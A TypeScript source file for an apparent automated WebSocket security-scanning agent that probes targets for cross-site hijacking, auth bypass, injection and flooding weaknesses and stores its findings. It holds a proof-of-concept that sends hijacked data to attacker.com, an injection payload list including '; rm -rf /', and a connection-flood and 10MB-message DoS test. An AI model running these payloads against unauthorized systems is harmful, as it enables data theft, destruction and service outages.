import { Job } from 'bullmq';
import { BaseAgent } from './base';
import { BaseJob } from '../../../shared/types';
import logger from '../utils/logger';
import database from '../services/database';
import events from '../services/events';
import { EnhancedAgentCapabilities } from './enhanced-capabilities';
import { sharedMemory } from '../services/three-agent/shared-memory';
import { v4 as uuidv4 } from 'uuid';
import axios from 'axios';

export interface WebSocketJob extends BaseJob {
  programId: string;
  urls: string[];
  options: {
    testCSWSH?: boolean;
    testMessageInjection?: boolean;
    testAuthBypass?: boolean;
    testDoS?: boolean;
    testOriginValidation?: boolean;
    testProtocolConfusion?: boolean;
    timeout?: number;
  };
}

export interface WebSocketResult {
  vulnerabilities: Array<{
    url: string;
    endpoint: string;
    type:
      | 'ws-cswsh'
      | 'ws-message-injection'
      | 'ws-auth-bypass'
      | 'ws-dos'
      | 'ws-origin-bypass'
      | 'ws-protocol-confusion'
      | 'ws-unencrypted';
    severity: 'critical' | 'high' | 'medium' | 'low';
    confidence: number;
    evidence: string;
    impact: string;
    remediation: string;
    poc?: string;
  }>;
  testedEndpoints: number;
  executionTime: number;
}

/**
 * WebSocket Security Testing Agent
 *
 * Tests WebSocket implementations for vulnerabilities:
 * - CSWSH (Cross-Site WebSocket Hijacking)
 * - Message injection attacks
 * - Authentication bypass
 * - DoS via ping/pong flood
 * - Origin header validation bypass
 * - Protocol confusion attacks
 * - Unencrypted WebSocket (ws:// instead of wss://)
 * - Message tampering
 * - Connection hijacking
 *
 * WebSocket-specific vectors:
 * - Upgrade request manipulation
 * - Frame injection
 * - Reconnection abuse
 * - Broadcast message amplification
 *
 * Tools: wscat, websocat patterns
 */
export class WebSocketAgent extends BaseAgent<WebSocketJob> {
  private enhanced = new EnhancedAgentCapabilities();

  constructor() {
    super('websocket' as any);
  }

  protected getSteps() {
    return [
      { name: 'Identify WebSocket endpoints', metadata: { phase: 'discovery' } },
      { name: 'Test CSWSH vulnerabilities', metadata: { phase: 'cswsh-testing' } },
      { name: 'Test message injection', metadata: { phase: 'injection-testing' } },
      { name: 'Test authentication bypass', metadata: { phase: 'auth-testing' } },
      { name: 'Test DoS attacks', metadata: { phase: 'dos-testing' } },
      { name: 'Test origin validation', metadata: { phase: 'origin-testing' } },
      { name: 'Store findings', metadata: { phase: 'reporting' } },
    ];
  }

  async process(job: Job<WebSocketJob>): Promise<WebSocketResult> {
    const { programId, urls, options } = job.data;
    const startTime = Date.now();

    await this.updateJobStatus(job.id, 'active');
    await this.logExecution(
      job.id,
      programId,
      'websocket',
      'start',
      'info',
      `Starting WebSocket testing on ${urls.length} URLs`
    );

    const result: WebSocketResult = {
      vulnerabilities: [],
      testedEndpoints: 0,
      executionTime: 0,
    };

    try {
      // Step 1: Identify WebSocket endpoints
      await this.updateStepStatus(job.id, 0, 'running');
      const endpoints = await this.identifyWebSocketEndpoints(urls, programId, job.id);
      result.testedEndpoints = endpoints.length;
      await this.updateStepStatus(job.id, 0, 'completed', { endpointsFound: endpoints.length });

      // Step 2: Test CSWSH
      if (options.testCSWSH !== false) {
        await this.updateStepStatus(job.id, 1, 'running');
        const cswshVulns = await this.testCSWSH(endpoints, programId, job.id, options);
        result.vulnerabilities.push(...cswshVulns);
        await this.updateStepStatus(job.id, 1, 'completed', {
          vulnerabilitiesFound: cswshVulns.length,
        });
      }

      // Step 3: Test message injection
      if (options.testMessageInjection !== false) {
        await this.updateStepStatus(job.id, 2, 'running');
        const injectionVulns = await this.testMessageInjection(endpoints, programId, job.id, options);
        result.vulnerabilities.push(...injectionVulns);
        await this.updateStepStatus(job.id, 2, 'completed', {
          vulnerabilitiesFound: injectionVulns.length,
        });
      }

      // Step 4: Test authentication bypass
      if (options.testAuthBypass !== false) {
        await this.updateStepStatus(job.id, 3, 'running');
        const authVulns = await this.testAuthBypass(endpoints, programId, job.id, options);
        result.vulnerabilities.push(...authVulns);
        await this.updateStepStatus(job.id, 3, 'completed', {
          vulnerabilitiesFound: authVulns.length,
        });
      }

      // Step 5: Test DoS attacks
      if (options.testDoS !== false) {
        await this.updateStepStatus(job.id, 4, 'running');
        const dosVulns = await this.testDoS(endpoints, programId, job.id, options);
        result.vulnerabilities.push(...dosVulns);
        await this.updateStepStatus(job.id, 4, 'completed', {
          vulnerabilitiesFound: dosVulns.length,
        });
      }

      // Step 6: Test origin validation
      if (options.testOriginValidation !== false) {
        await this.updateStepStatus(job.id, 5, 'running');
        const originVulns = await this.testOriginValidation(endpoints, programId, job.id, options);
        result.vulnerabilities.push(...originVulns);
        await this.updateStepStatus(job.id, 5, 'completed', {
          vulnerabilitiesFound: originVulns.length,
        });
      }

      // Step 7: Store findings
      await this.updateStepStatus(job.id, 6, 'running');
      if (result.vulnerabilities.length > 0) {
        await this.storeFindingsInDatabase(result.vulnerabilities, programId, job.id);
      }
      await this.updateStepStatus(job.id, 6, 'completed', {
        totalVulnerabilities: result.vulnerabilities.length,
      });

      // Three-agent integration
      const { swarmId, enableSharedMemory } = job.data as any;
      if (swarmId && enableSharedMemory && result.vulnerabilities.length > 0) {
        await this.shareWithSwarm(swarmId, result.vulnerabilities, job.id);
      }

      result.executionTime = Date.now() - startTime;

      await this.updateJobStatus(job.id, 'completed', result);
      await this.logExecution(
        job.id,
        programId,
        'websocket',
        'complete',
        'success',
        `Found ${result.vulnerabilities.length} WebSocket vulnerabilities in ${result.executionTime}ms`
      );

      if (result.vulnerabilities.length > 0) {
        await this.triggerHandoffs(job, result);
      }

      return result;
    } catch (error: any) {
      await this.logExecution(
        job.id,
        programId,
        'websocket',
        'error',
        'error',
        `Error: ${error.message}`
      );
      await this.updateJobStatus(job.id, 'failed', { error: error.message });
      throw error;
    }
  }

  /**
   * Identify WebSocket endpoints
   * Look for ws:// or wss:// URLs and upgrade endpoints
   */
  private async identifyWebSocketEndpoints(
    urls: string[],
    programId: string,
    jobId: string
  ): Promise<string[]> {
    const wsEndpoints: string[] = [];

    for (const url of urls) {
      try {
        // Convert HTTP URLs to WebSocket URLs
        const wsUrl = url.replace(/^http/, 'ws');

        // Test for WebSocket upgrade capability
        const response = await axios.get(url, {
          timeout: 10000,
          headers: {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Version': '13',
            'Sec-WebSocket-Key': Buffer.from(uuidv4()).toString('base64'),
          },
          validateStatus: () => true,
        });

        // Check for WebSocket upgrade response
        const isWebSocketEndpoint =
          response.status === 101 ||
          response.headers['upgrade']?.toLowerCase() === 'websocket' ||
          response.headers['connection']?.toLowerCase().includes('upgrade');

        if (isWebSocketEndpoint) {
          wsEndpoints.push(wsUrl);
        }

        // Check response body for WebSocket references
        const responseBody = typeof response.data === 'string' ? response.data : '';
        if (
          responseBody.includes('ws://') ||
          responseBody.includes('wss://') ||
          responseBody.includes('WebSocket') ||
          responseBody.includes('socket.io')
        ) {
          wsEndpoints.push(wsUrl);
        }
      } catch (error: any) {
        logger.debug({ url, error: error.message }, 'Error identifying WebSocket endpoint');
      }
    }

    // Also check for common WebSocket patterns
    const wsPatterns = urls
      .filter(
        (url) =>
          url.includes('/ws') ||
          url.includes('/socket') ||
          url.includes('/realtime') ||
          url.includes('/stream') ||
          url.includes('/chat')
      )
      .map((url) => url.replace(/^http/, 'ws'));

    const allEndpoints = [...new Set([...wsEndpoints, ...wsPatterns])];
    return allEndpoints.length > 0 ? allEndpoints : urls.slice(0, 5).map((url) => url.replace(/^http/, 'ws'));
  }

  /**
   * Test CSWSH (Cross-Site WebSocket Hijacking)
   * Similar to CSRF but for WebSocket connections
   */
  private async testCSWSH(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: WebSocketJob['options']
  ): Promise<WebSocketResult['vulnerabilities']> {
    const vulnerabilities: WebSocketResult['vulnerabilities'] = [];

    for (const endpoint of endpoints) {
      try {
        // Test WebSocket connection without CSRF token
        // In real implementation, would use WebSocket library
        // Here we test the HTTP upgrade handshake

        const response = await axios.get(endpoint.replace(/^ws/, 'http'), {
          timeout: 10000,
          headers: {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Version': '13',
            'Sec-WebSocket-Key': Buffer.from(uuidv4()).toString('base64'),
            'Origin': 'https://evil.com', // Malicious origin
          },
          validateStatus: () => true,
        });

        // If WebSocket upgrade succeeds without origin validation
        if (response.status === 101) {
          vulnerabilities.push({
            url: endpoint,
            endpoint,
            type: 'ws-cswsh',
            severity: 'high',
            confidence: 0.9,
            evidence: `WebSocket connection established from malicious origin (https://evil.com) without CSRF protection`,
            impact:
              'CSWSH allows attackers to establish WebSocket connections from malicious websites, enabling them to send/receive messages on behalf of authenticated users.',
            remediation:
              'Implement CSRF tokens in WebSocket handshake. Validate Origin header. Use session tokens in connection URL or initial message. Require explicit user consent for WebSocket connections.',
            poc: `<script>
const ws = new WebSocket('${endpoint}');
ws.onopen = () => ws.send(JSON.stringify({action: 'steal_data'}));
ws.onmessage = (e) => fetch('https://attacker.com/log?data=' + e.data);
</script>`,
          });
        }
      } catch (error: any) {
        logger.debug({ endpoint, error: error.message }, 'Error testing CSWSH');
      }
    }

    return vulnerabilities;
  }

  /**
   * Test message injection attacks
   */
  private async testMessageInjection(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: WebSocketJob['options']
  ): Promise<WebSocketResult['vulnerabilities']> {
    const vulnerabilities: WebSocketResult['vulnerabilities'] = [];

    const injectionPayloads = [
      {
        name: 'XSS in WebSocket message',
        payload: { message: '<script>alert(document.domain)</script>' },
      },
      {
        name: 'SQL injection',
        payload: { query: "' OR '1'='1" },
      },
      {
        name: 'Command injection',
        payload: { command: '; rm -rf /' },
      },
      {
        name: 'JSON injection',
        payload: '{"admin":true, "role":"administrator"}',
      },
      {
        name: 'Protocol injection',
        payload: { type: 'ADMIN_COMMAND', action: 'grant_access' },
      },
    ];

    for (const endpoint of endpoints) {
      for (const test of injectionPayloads) {
        try {
          // Simulate WebSocket message send
          // In real implementation, would use WebSocket client
          const httpEndpoint = endpoint.replace(/^ws/, 'http');

          const response = await axios.post(
            httpEndpoint,
            test.payload,
            {
              timeout: 10000,
              headers: {
                'Content-Type': 'application/json',
              },
              validateStatus: () => true,
            }
          );

          const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

          // Check for injection indicators
          const hasInjectionError =
            responseBody.includes('SQL') ||
            responseBody.includes('syntax error') ||
            responseBody.includes('command') ||
            responseBody.toLowerCase().includes('error') ||
            responseBody.includes('<script>');

          if (hasInjectionError) {
            vulnerabilities.push({
              url: endpoint,
              endpoint,
              type: 'ws-message-injection',
              severity: 'high',
              confidence: 0.75,
              evidence: `${test.name}: Injection possible in WebSocket messages - ${responseBody.substring(0, 200)}`,
              impact:
                'Message injection can lead to XSS, SQLi, command injection, or privilege escalation if WebSocket messages are not properly sanitized.',
              remediation:
                'Sanitize and validate all WebSocket message payloads. Implement message schema validation. Encode output before broadcasting to other clients.',
            });
            break;
          }
        } catch (error: any) {
          logger.debug({ endpoint, test, error: error.message }, 'Error testing message injection');
        }
      }
    }

    return vulnerabilities;
  }

  /**
   * Test authentication bypass
   */
  private async testAuthBypass(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: WebSocketJob['options']
  ): Promise<WebSocketResult['vulnerabilities']> {
    const vulnerabilities: WebSocketResult['vulnerabilities'] = [];

    for (const endpoint of endpoints) {
      try {
        // Test WebSocket connection without authentication
        const response = await axios.get(endpoint.replace(/^ws/, 'http'), {
          timeout: 10000,
          headers: {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Version': '13',
            'Sec-WebSocket-Key': Buffer.from(uuidv4()).toString('base64'),
            // No authentication headers
          },
          validateStatus: () => true,
        });

        // If WebSocket upgrade succeeds without authentication
        if (response.status === 101) {
          vulnerabilities.push({
            url: endpoint,
            endpoint,
            type: 'ws-auth-bypass',
            severity: 'critical',
            confidence: 0.85,
            evidence: `WebSocket connection established without authentication credentials`,
            impact:
              'Authentication bypass allows unauthorized WebSocket connections, enabling attackers to access real-time data streams and send unauthorized commands.',
            remediation:
              'Require authentication for WebSocket connections. Validate session tokens. Use Sec-WebSocket-Protocol for auth tokens. Implement connection authorization.',
          });
        }

        // Test with invalid token
        const invalidAuthResponse = await axios.get(endpoint.replace(/^ws/, 'http'), {
          timeout: 10000,
          headers: {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Version': '13',
            'Sec-WebSocket-Key': Buffer.from(uuidv4()).toString('base64'),
            'Authorization': 'Bearer invalid_token_12345',
          },
          validateStatus: () => true,
        });

        if (invalidAuthResponse.status === 101) {
          vulnerabilities.push({
            url: endpoint,
            endpoint,
            type: 'ws-auth-bypass',
            severity: 'critical',
            confidence: 0.9,
            evidence: `WebSocket connection established with invalid authentication token`,
            impact:
              'Invalid token acceptance allows attackers to bypass authentication by providing any token value.',
            remediation:
              'Properly validate authentication tokens. Return 401 Unauthorized for invalid credentials. Log authentication failures.',
          });
        }
      } catch (error: any) {
        logger.debug({ endpoint, error: error.message }, 'Error testing auth bypass');
      }
    }

    return vulnerabilities;
  }

  /**
   * Test DoS attacks
   */
  private async testDoS(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: WebSocketJob['options']
  ): Promise<WebSocketResult['vulnerabilities']> {
    const vulnerabilities: WebSocketResult['vulnerabilities'] = [];

    for (const endpoint of endpoints) {
      try {
        // Test ping flood
        const pingTests = [];
        for (let i = 0; i < 100; i++) {
          pingTests.push(
            axios.get(endpoint.replace(/^ws/, 'http'), {
              timeout: 5000,
              headers: {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Version': '13',
                'Sec-WebSocket-Key': Buffer.from(uuidv4()).toString('base64'),
              },
              validateStatus: () => true,
            })
          );
        }

        const startTime = Date.now();
        const responses = await Promise.all(pingTests);
        const duration = Date.now() - startTime;

        const successCount = responses.filter((r) => r.status === 101).length;

        // If many connections accepted quickly without rate limiting
        if (successCount > 50 && duration < 10000) {
          vulnerabilities.push({
            url: endpoint,
            endpoint,
            type: 'ws-dos',
            severity: 'medium',
            confidence: 0.8,
            evidence: `Server accepted ${successCount}/100 concurrent WebSocket connections in ${duration}ms without rate limiting`,
            impact:
              'Lack of rate limiting allows DoS attacks via connection flooding, exhausting server resources.',
            remediation:
              'Implement connection rate limiting per IP. Set max concurrent connections per user. Add backpressure mechanisms. Use connection timeout.',
          });
        }

        // Test large message DoS
        const largeMessage = Buffer.alloc(10 * 1024 * 1024).toString('base64'); // 10MB
        try {
          const largeMessageResponse = await axios.post(
            endpoint.replace(/^ws/, 'http'),
            { data: largeMessage },
            {
              timeout: 30000,
              validateStatus: () => true,
            }
          );

          // If server accepts without size limits
          if (largeMessageResponse.status === 200) {
            vulnerabilities.push({
              url: endpoint,
              endpoint,
              type: 'ws-dos',
              severity: 'medium',
              confidence: 0.7,
              evidence: `Server accepted ${(largeMessage.length / 1024 / 1024).toFixed(2)}MB WebSocket message without size limits`,
              impact:
                'No message size limits allows memory exhaustion DoS attacks.',
              remediation:
                'Implement max message size limits. Set max frame size. Add message validation before processing.',
            });
          }
        } catch (error: any) {
          logger.debug({ endpoint, error: error.message }, 'Large message test error (expected)');
        }
      } catch (error: any) {
        logger.debug({ endpoint, error: error.message }, 'Error testing DoS');
      }
    }

    return vulnerabilities;
  }

  /**
   * Test origin validation bypass
   */
  private async testOriginValidation(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: WebSocketJob['options']
  ): Promise<WebSocketResult['vulnerabilities']> {
    const vulnerabilities: WebSocketResult['vulnerabilities'] = [];

    const originTests = [
      { name: 'Null origin', origin: 'null' },
      { name: 'Evil origin', origin: 'https://evil.com' },
      { name: 'Subdomain bypass', origin: 'https://evil.example.com' },
      { name: 'No origin header', origin: null },
    ];

    for (const endpoint of endpoints) {
      // Check if WebSocket is unencrypted
      if (endpoint.startsWith('ws://')) {
        vulnerabilities.push({
          url: endpoint,
          endpoint,
          type: 'ws-unencrypted',
          severity: 'high',
          confidence: 1.0,
          evidence: `WebSocket connection uses unencrypted ws:// instead of wss://`,
          impact:
            'Unencrypted WebSocket allows man-in-the-middle attacks. All messages can be intercepted and modified in transit.',
          remediation:
            'Always use wss:// (WebSocket Secure) in production. Enforce TLS 1.2+. Use HSTS to prevent downgrade attacks.',
          poc: `Intercept with mitmproxy: all WebSocket messages visible in plaintext`,
        });
      }

      for (const test of originTests) {
        try {
          const headers: Record<string, string> = {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Version': '13',
            'Sec-WebSocket-Key': Buffer.from(uuidv4()).toString('base64'),
          };

          if (test.origin !== null) {
            headers['Origin'] = test.origin;
          }

          const response = await axios.get(endpoint.replace(/^ws/, 'http'), {
            timeout: 10000,
            headers,
            validateStatus: () => true,
          });

          // If connection succeeds with malicious origin
          if (response.status === 101) {
            vulnerabilities.push({
              url: endpoint,
              endpoint,
              type: 'ws-origin-bypass',
              severity: 'high',
              confidence: 0.88,
              evidence: `${test.name}: WebSocket accepted connection from ${test.origin || 'missing origin'}`,
              impact:
                'Origin validation bypass allows cross-origin WebSocket connections, enabling CSWSH attacks.',
              remediation:
                'Validate Origin header against allowlist. Reject connections from untrusted origins. Log origin validation failures.',
            });
            break;
          }
        } catch (error: any) {
          logger.debug({ endpoint, test, error: error.message }, 'Error testing origin validation');
        }
      }
    }

    return vulnerabilities;
  }

  /**
   * Store findings in database
   */
  private async storeFindingsInDatabase(
    vulnerabilities: WebSocketResult['vulnerabilities'],
    programId: string,
    jobId: string
  ) {
    for (const vuln of vulnerabilities) {
      await database.query(
        `INSERT INTO findings (
          program_id, job_id, type, severity, url, evidence,
          poc, remediation, confidence, metadata, created_at
        ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, NOW())
        ON CONFLICT (program_id, url, type) DO UPDATE SET
          evidence = EXCLUDED.evidence,
          updated_at = NOW()`,
        [
          programId,
          jobId,
          vuln.type,
          vuln.severity,
          vuln.url,
          vuln.evidence,
          vuln.poc || '',
          vuln.remediation,
          vuln.confidence,
          JSON.stringify({
            endpoint: vuln.endpoint,
            impact: vuln.impact,
          }),
        ]
      );
    }

    events.emit('findings:new', {
      programId,
      count: vulnerabilities.length,
      severity: vulnerabilities[0]?.severity || 'medium',
    });
  }

  /**
   * Share with three-agent swarm
   */
  private async shareWithSwarm(
    swarmId: string,
    vulnerabilities: WebSocketResult['vulnerabilities'],
    jobId: string
  ) {
    try {
      const findings = vulnerabilities.map((vuln) => ({
        id: uuidv4(),
        type: `ws-${vuln.type}`,
        severity: vuln.severity,
        url: vuln.url,
        evidence: vuln.evidence,
        confidence: vuln.confidence,
        timestamp: new Date(),
        discoveredBy: `websocket-${jobId}`,
        metadata: {
          impact: vuln.impact,
          poc: vuln.poc,
        },
      }));

      await sharedMemory.storeFindings(swarmId, findings);

      logger.info(
        { swarmId, findingsShared: findings.length },
        '⚡ WebSocket agent shared findings with swarm'
      );
    } catch (error: any) {
      logger.error({ error, swarmId }, 'Failed to share WebSocket findings with swarm');
    }
  }

  /**
   * Trigger handoffs
   */
  private async triggerHandoffs(job: Job<WebSocketJob>, result: WebSocketResult) {
    const { programId } = job.data;

    // Critical vulnerabilities -> escalate
    const criticalVulns = result.vulnerabilities.filter(
      (v) => v.severity === 'critical' || v.type === 'ws-cswsh' || v.type === 'ws-auth-bypass'
    );

    if (criticalVulns.length > 0) {
      await this.createHandoff(
        job.id,
        'websocket',
        'triage',
        {
          reason: 'Critical WebSocket vulnerabilities detected (CSWSH/auth bypass)',
          vulnerabilities: criticalVulns,
          priority: 'critical',
        },
        programId
      );
    }

    // Confirm all findings
    if (result.vulnerabilities.length > 0) {
      await this.createHandoff(
        job.id,
        'websocket',
        'confirm',
        {
          reason: 'WebSocket vulnerabilities require manual confirmation',
          targets: result.vulnerabilities.map((v) => v.url),
          testType: 'websocket',
        },
        programId
      );
    }
  }
}
